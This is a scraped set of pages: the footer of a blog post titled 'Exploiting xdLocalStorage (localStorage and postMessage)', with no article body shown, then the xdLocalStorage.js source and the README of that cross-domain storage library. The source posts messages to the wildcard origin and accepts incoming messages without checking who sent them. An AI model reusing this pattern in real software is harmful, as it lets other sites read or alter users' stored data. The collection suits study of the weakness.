* [Click to share on Reddit (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=reddit "Click to share on Reddit")
* [Click to share on LinkedIn (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=linkedin "Click to share on LinkedIn")
* More

* [Click to share on WhatsApp (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=jetpack-whatsapp "Click to share on WhatsApp")
* [Click to share on Telegram (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=telegram "Click to share on Telegram")
* [Click to print (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/#print "Click to print")
* [Click to share on Pocket (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=pocket "Click to share on Pocket")
* [Click to share on Tumblr (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=tumblr "Click to share on Tumblr")
* [Click to share on Pinterest (Opens in new window)](https://grimhacker.com/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/?share=pinterest "Click to share on Pinterest")
* Click to email a link to a friend (Opens in new window)

### *Related*

Published in[Disclosures](https://grimhacker.com/category/disclosures/ "View all posts in Disclosures")[Tools and Techniques](https://grimhacker.com/category/tools/ "View all posts in Tools and Techniques")

* [html5](https://grimhacker.com/tag/html5/ "View all posts tagged html5")
* [localstorage](https://grimhacker.com/tag/localstorage/ "View all posts tagged localstorage")
* [postmessage](https://grimhacker.com/tag/postmessage/ "View all posts tagged postmessage")
* [same origin policy](https://grimhacker.com/tag/same-origin-policy/ "View all posts tagged same origin policy")
* [web messaging](https://grimhacker.com/tag/web-messaging/ "View all posts tagged web messaging")
* [web storage](https://grimhacker.com/tag/web-storage/ "View all posts tagged web storage")
* [xdlocalstorage](https://grimhacker.com/tag/xdlocalstorage/ "View all posts tagged xdlocalstorage")

Previous Post
[Parsing .DS\_Store Files](https://grimhacker.com/2019/05/06/parsing-ds_store-files/)
Next Post
[SQLAlchemy Postgres On Conflict Do Update “can’t adapt type ‘method'”](https://grimhacker.com/2022/02/05/sqlalchemy-postgres-on-conflict-do-update-cant-adapt-type-method/)

## Be First to Comment

### Leave a Reply [Cancel reply](/2020/04/02/exploiting-xdlocalstorage-localstorage-and-postmessage/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name\*

Email\*

Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

[Author WordPress Theme](https://www.competethemes.com/author/) by Compete Themes

Scroll to the top

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###



=== Content from github.com_77643141_20250119_141606.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fofirdagan%2Fcross-domain-local-storage%2Fblob%2Fb6c929feffaed81a4e834ccf19ace7d5f94fc92b%2Fapp%2Fscripts%2FxdLocalStorage.js)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fofirdagan%2Fcross-domain-local-storage%2Fblob%2Fb6c929feffaed81a4e834ccf19ace7d5f94fc92b%2Fapp%2Fscripts%2FxdLocalStorage.js)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=ofirdagan%2Fcross-domain-local-storage)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ofirdagan](/ofirdagan)
/
**[cross-domain-local-storage](/ofirdagan/cross-domain-local-storage)**
Public

* [Notifications](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage) You must be signed in to change notification settings
* [Fork
  65](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage)
* [Star
   395](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage)

* [Code](/ofirdagan/cross-domain-local-storage)
* [Issues
  11](/ofirdagan/cross-domain-local-storage/issues)
* [Pull requests
  2](/ofirdagan/cross-domain-local-storage/pulls)
* [Actions](/ofirdagan/cross-domain-local-storage/actions)
* [Projects
  0](/ofirdagan/cross-domain-local-storage/projects)
* [Wiki](/ofirdagan/cross-domain-local-storage/wiki)
* [Security](/ofirdagan/cross-domain-local-storage/security)
* [Insights](/ofirdagan/cross-domain-local-storage/pulse)

Additional navigation options

* [Code](/ofirdagan/cross-domain-local-storage)
* [Issues](/ofirdagan/cross-domain-local-storage/issues)
* [Pull requests](/ofirdagan/cross-domain-local-storage/pulls)
* [Actions](/ofirdagan/cross-domain-local-storage/actions)
* [Projects](/ofirdagan/cross-domain-local-storage/projects)
* [Wiki](/ofirdagan/cross-domain-local-storage/wiki)
* [Security](/ofirdagan/cross-domain-local-storage/security)
* [Insights](/ofirdagan/cross-domain-local-storage/pulse)

## Files

 b6c929f
## Breadcrumbs

1. [cross-domain-local-storage](/ofirdagan/cross-domain-local-storage/tree/b6c929feffaed81a4e834ccf19ace7d5f94fc92b)
2. /[app](/ofirdagan/cross-domain-local-storage/tree/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app)
3. /[scripts](/ofirdagan/cross-domain-local-storage/tree/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts)
/
# xdLocalStorage.js

Copy path Blame  Blame
## Latest commit

## History

[History](/ofirdagan/cross-domain-local-storage/commits/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js)165 lines (155 loc) · 4.06 KB b6c929f
## Breadcrumbs

1. [cross-domain-local-storage](/ofirdagan/cross-domain-local-storage/tree/b6c929feffaed81a4e834ccf19ace7d5f94fc92b)
2. /[app](/ofirdagan/cross-domain-local-storage/tree/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app)
3. /[scripts](/ofirdagan/cross-domain-local-storage/tree/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts)
/
# xdLocalStorage.js

Top
## File metadata and controls

* Code
* Blame

165 lines (155 loc) · 4.06 KB[Raw](https://github.com/ofirdagan/cross-domain-local-storage/raw/b6c929feffaed81a4e834ccf19ace7d5f94fc92b/app/scripts/xdLocalStorage.js)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165/\*\* \* Created by dagan on 07/04/2014. \*/'use strict';/\* global console, XdUtils \*/window.xdLocalStorage = window.xdLocalStorage || (function () { var MESSAGE\_NAMESPACE = 'cross-domain-local-message'; var options = { iframeId: 'cross-domain-iframe', iframeUrl: undefined, initCallback: function () {} }; var requestId = -1; var iframe; var requests = {}; var wasInit = false; var iframeReady = true;
 function applyCallback(data) { if (requests[data.id]) { requests[data.id](data); delete requests[data.id]; } }
 function receiveMessage(event) { var data; try { data = JSON.parse(event.data); } catch (err) { //not our message, can ignore } if (data && data.namespace === MESSAGE\_NAMESPACE) { if (data.id === 'iframe-ready') { iframeReady = true; options.initCallback(); } else { applyCallback(data); } } }
 function buildMessage(action, key, value, callback) { requestId++; requests[requestId] = callback; var data = { namespace: MESSAGE\_NAMESPACE, id: requestId, action: action, key: key, value: value }; iframe.contentWindow.postMessage(JSON.stringify(data), '\*'); }
 function init(customOptions) { options = XdUtils.extend(customOptions, options); var temp = document.createElement('div');
 if (window.addEventListener) { window.addEventListener('message', receiveMessage, false); } else { window.attachEvent('onmessage', receiveMessage); }
 temp.innerHTML = '<iframe id="' + options.iframeId + '" src="' + options.iframeUrl + '" style="display: none;"></iframe>'; document.body.appendChild(temp); iframe = document.getElementById(options.iframeId); }
 function isApiReady() { if (!wasInit) { console.log('You must call xdLocalStorage.init() before using it.'); return false; } if (!iframeReady) { console.log('You must wait for iframe ready message before using the api.'); return false; } return true; }
 function isDomReady() { return (document.readyState === 'complete'); }
 return { //callback is optional for cases you use the api before window load. init: function (customOptions) { if (!customOptions.iframeUrl) { throw 'You must specify iframeUrl'; } if (wasInit) { console.log('xdLocalStorage was already initialized!'); return; } wasInit = true; if (isDomReady()) { init(customOptions); } else { if (document.addEventListener) { // All browsers expect IE < 9 document.addEventListener('readystatechange', function () { if (isDomReady()) { init(customOptions); } }); } else { // IE < 9 document.attachEvent('readystatechange', function () { if (isDomReady()) { init(customOptions); } }); } } }, setItem: function (key, value, callback) { if (!isApiReady()) { return; } buildMessage('set', key, value, callback); },
 getItem: function (key, callback) { if (!isApiReady()) { return; } buildMessage('get', key, null, callback); }, removeItem: function (key, callback) { if (!isApiReady()) { return; } buildMessage('remove', key, null, callback); }, key: function (index, callback) { if (!isApiReady()) { return; } buildMessage('key', index, null, callback); }, getSize: function(callback) { if(!isApiReady()) { return; } buildMessage('size', null, null, callback); }, getLength: function(callback) { if(!isApiReady()) { return; } buildMessage('length', null, null, callback); }, clear: function (callback) { if (!isApiReady()) { return; } buildMessage('clear', null, null, callback); }, wasInit: function () { return wasInit; } };})();

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_06986a60_20250119_124347.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fofirdagan%2Fcross-domain-local-storage)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fofirdagan%2Fcross-domain-local-storage)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=ofirdagan%2Fcross-domain-local-storage)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ofirdagan](/ofirdagan)
/
**[cross-domain-local-storage](/ofirdagan/cross-domain-local-storage)**
Public

* [Notifications](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage) You must be signed in to change notification settings
* [Fork
  65](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage)
* [Star
   395](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage)

A neet solution for cross domain local storage using invisible iframe and post messages

### License

[MIT license](/ofirdagan/cross-domain-local-storage/blob/master/LICENSE)

[395
stars](/ofirdagan/cross-domain-local-storage/stargazers) [65
forks](/ofirdagan/cross-domain-local-storage/forks) [Branches](/ofirdagan/cross-domain-local-storage/branches) [Tags](/ofirdagan/cross-domain-local-storage/tags) [Activity](/ofirdagan/cross-domain-local-storage/activity)
 [Star](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage)

 [Notifications](/login?return_to=%2Fofirdagan%2Fcross-domain-local-storage) You must be signed in to change notification settings

* [Code](/ofirdagan/cross-domain-local-storage)
* [Issues
  11](/ofirdagan/cross-domain-local-storage/issues)
* [Pull requests
  2](/ofirdagan/cross-domain-local-storage/pulls)
* [Actions](/ofirdagan/cross-domain-local-storage/actions)
* [Projects
  0](/ofirdagan/cross-domain-local-storage/projects)
* [Wiki](/ofirdagan/cross-domain-local-storage/wiki)
* [Security](/ofirdagan/cross-domain-local-storage/security)
* [Insights](/ofirdagan/cross-domain-local-storage/pulse)

Additional navigation options

* [Code](/ofirdagan/cross-domain-local-storage)
* [Issues](/ofirdagan/cross-domain-local-storage/issues)
* [Pull requests](/ofirdagan/cross-domain-local-storage/pulls)
* [Actions](/ofirdagan/cross-domain-local-storage/actions)
* [Projects](/ofirdagan/cross-domain-local-storage/projects)
* [Wiki](/ofirdagan/cross-domain-local-storage/wiki)
* [Security](/ofirdagan/cross-domain-local-storage/security)
* [Insights](/ofirdagan/cross-domain-local-storage/pulse)

# ofirdagan/cross-domain-local-storage

    master[Branches](/ofirdagan/cross-domain-local-storage/branches)[Tags](/ofirdagan/cross-domain-local-storage/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[97 Commits](/ofirdagan/cross-domain-local-storage/commits/master/) | | |
| [app](/ofirdagan/cross-domain-local-storage/tree/master/app "app") | | [app](/ofirdagan/cross-domain-local-storage/tree/master/app "app") |  |  |
| [dist](/ofirdagan/cross-domain-local-storage/tree/master/dist "dist") | | [dist](/ofirdagan/cross-domain-local-storage/tree/master/dist "dist") |  |  |
| [test/specs](/ofirdagan/cross-domain-local-storage/tree/master/test/specs "This path skips through empty directories") | | [test/specs](/ofirdagan/cross-domain-local-storage/tree/master/test/specs "This path skips through empty directories") |  |  |
| [.gitignore](/ofirdagan/cross-domain-local-storage/blob/master/.gitignore ".gitignore") | | [.gitignore](/ofirdagan/cross-domain-local-storage/blob/master/.gitignore ".gitignore") |  |  |
| [.jshintrc](/ofirdagan/cross-domain-local-storage/blob/master/.jshintrc ".jshintrc") | | [.jshintrc](/ofirdagan/cross-domain-local-storage/blob/master/.jshintrc ".jshintrc") |  |  |
| [Gruntfile.js](/ofirdagan/cross-domain-local-storage/blob/master/Gruntfile.js "Gruntfile.js") | | [Gruntfile.js](/ofirdagan/cross-domain-local-storage/blob/master/Gruntfile.js "Gruntfile.js") |  |  |
| [LICENSE](/ofirdagan/cross-domain-local-storage/blob/master/LICENSE "LICENSE") | | [LICENSE](/ofirdagan/cross-domain-local-storage/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/ofirdagan/cross-domain-local-storage/blob/master/README.md "README.md") | | [README.md](/ofirdagan/cross-domain-local-storage/blob/master/README.md "README.md") |  |  |
| [bower.json](/ofirdagan/cross-domain-local-storage/blob/master/bower.json "bower.json") | | [bower.json](/ofirdagan/cross-domain-local-storage/blob/master/bower.json "bower.json") |  |  |
| [karma.conf.js](/ofirdagan/cross-domain-local-storage/blob/master/karma.conf.js "karma.conf.js") | | [karma.conf.js](/ofirdagan/cross-domain-local-storage/blob/master/karma.conf.js "karma.conf.js") |  |  |
| [package.json](/ofirdagan/cross-domain-local-storage/blob/master/package.json "package.json") | | [package.json](/ofirdagan/cross-domain-local-storage/blob/master/package.json "package.json") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# Cross Domain Local Storage

1. [Problem](#problem)
2. [Solution](#solution)
3. [Why not use cookies?](#why-not-use-cookies)
4. [Installation](#installation)
5. [Usage](#usage)
6. [API](#api)
7. [Angular Support](#angular-support)
8. [Demo](#demo)
9. [Tests](#tests)
10. [Limitations](#limitations)

## Problem

As for now, standard HTML5 Web Storage (a.k.a Local Storage) doesn't now allow cross domain data sharing.
This may be a big problem in an organization which have a lot of sub domains and wants to share client data between them.

## Solution

xdLocalStorage is a lightweight js library which implements LocalStorage interface and support cross domain storage by using iframe post message communication.

## Why not use cookies?

Although cookies can be shared between sub domains, cookies have the overhead of being sent to the server on each request.
They're also have a size limit (4K for all cookies together)

## Installation

Download latest release from [here](https://github.com/ofirdagan/cross-domain-local-storage/releases) or use bower/npm (recommended)

```
bower install xdLocalStorage --save
or
npm install --save xdlocalstorage
```

## Usage

* Create an empty html with the following content:

```
<!DOCTYPE html>
<html>
<head>
    <script src="xdLocalStoragePostMessageApi.min.js"></script>
</head>
<body>
    This is the magical iframe
</body>
</html>
```

* On your client page (the page you will read/store your data from) add:

```
 <!-- if you use angular continue reading.. there's angular support -->
 <script src="scripts/xdLocalStorage.min.js"></script>
```

* Init xdLocalStorage

```
    xdLocalStorage.init(
        {
            /* required */
            iframeUrl:'path to your html from step 1',
            //an option function to be called right after the iframe was loaded and ready for action
            initCallback: function () {
                console.log('Got iframe ready');
            }
        }
    );
```

## API

```
    // Store
    xdLocalStorage.setItem(key, value, function (data) { /* callback */ });

    // Retrieve
    xdLocalStorage.getItem(key, function (data) { /* callback */ });

    // Remove
    xdLocalStorage.removeItem(key, function (data) { /* callback */ });

    // Key Name
    xdLocalStorage.key(index, function (data) { /* callback */ });

    // Clear All
    xdLocalStorage.clear(function (data) { /* callback */ });
```

## Angular Support

*UPDATE:* Since version 2.0.0 the xdLocalStorage service supports promise interface hence no more annoying callbacks :)

* import `ng-xdLocalStorage.min.js` instead of `xdLocalStorage.min.js`
* include xdLocalStorage module and call init in a run block.

```
angular.module('yourModule', ['xdLocalStorage']).run(function (xdLocalStorage) {
    xdLocalStorage.init(
     {
        /* required */
        iframeUrl:'path to your html from step 1'
    }).then(function () {
        //an option function to be called once the iframe was loaded and ready for action
        console.log('Got iframe ready');
    });
});
```

* inject xdLocalStorage where ever you want and use the API

```
angular.module('yourModule').run(function(xdLocalStorage) {
    xdLocalStorage.getItem(key).then(function (response) {
    	console.log(response.value);
    });
});
```

## Demo

**Here's the [demo](https://rawgit.com/ofirdagan/cross-domain-local-storage/master/app/index.html)**

## Tests

I covered the basic API with tests [here](https://github.com/ofirdagan/cross-domain-local-storage/blob/master/test/specs/xdLocalStorage.js)

## Limitations

Apple has updated the defaults on Safari 7+ both on desktop and mobile to block 3rd party data. The option is now called "Block cookies and other website data" which refers to things like localstorage which are now completely isolated by domain.

This implies that unfortunately this library will not be able to share cross domain information on Safari 7+.

## About

A neet solution for cross domain local storage using invisible iframe and post messages

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/ofirdagan/cross-domain-local-storage/activity)
### Stars

[**395**
stars](/ofirdagan/cross-domain-local-storage/stargazers)
### Watchers

[**21**
watching](/ofirdagan/cross-domain-local-storage/watchers)
### Forks

[**65**
forks](/ofirdagan/cross-domain-local-storage/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fofirdagan%2Fcross-domain-local-storage&report=ofirdagan+%28user%29)

## [Releases](/ofirdagan/cross-domain-local-storage/releases)

[18
tags](/ofirdagan/cross-domain-local-storage/tags)

## [Packages 0](/users/ofirdagan/packages?repo_name=cross-domain-local-storage)

No packages published

## [Contributors 8](/ofirdagan/cross-domain-local-storage/graphs/contributors)

## Languages

* [JavaScript
  79.6%](/ofirdagan/cross-domain-local-storage/search?l=javascript)
* [HTML
  19.0%](/ofirdagan/cross-domain-local-storage/search?l=html)
* [CSS
  1.4%](/ofirdagan/cross-domain-local-storage/search?l=css)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


